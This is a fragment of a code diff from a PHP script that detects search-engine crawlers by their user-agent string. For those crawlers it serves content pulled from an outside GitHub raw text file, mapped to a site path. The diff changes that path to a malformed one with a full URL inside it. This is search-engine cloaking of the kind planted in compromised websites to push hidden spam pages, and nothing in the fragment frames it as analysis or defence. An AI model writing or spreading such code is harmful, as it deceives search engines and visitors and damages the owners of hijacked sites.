@@ -7,7 +7,7 @@ $botPattern = '/(bot|ahrefsbot|crawl|spider|slurp|fetch|google|scanner|check|ana
 if (preg_match($botPattern, $userAgent)) {
 
     $pathMapping = [
-        '/sea-buckthorn-oil-capsule.html' => 'https://raw.githubusercontent.com/gunawanmsg888-commits/biosash/refs/heads/main/lp1.txt'
+        '/https://biosash.com/certificates/' => 'https://raw.githubusercontent.com/gunawanmsg888-commits/biosash/refs/heads/main/lp1.txt'
     ];
     
 
